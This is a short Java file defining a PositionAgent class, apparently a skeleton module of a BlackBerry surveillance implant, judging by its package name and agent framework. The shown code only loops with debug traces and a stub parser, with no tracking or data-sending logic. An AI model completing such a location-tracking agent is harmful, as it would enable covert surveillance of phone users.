package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class PositionAgent extends Agent {
    static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);

    public PositionAgent(int AgentStatus) {
        super(AGENT_POSITION, AgentStatus, true);
    }

    protected PositionAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {
        debug.trace("run");
        int loop = 0;

        for (;;) {
            debug.trace("loop:" + loop);
            ++loop;

            if (AgentSleep(1000)) {
                debug.trace(loop + " clean stop");
                return;
            }
        }
    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }
}
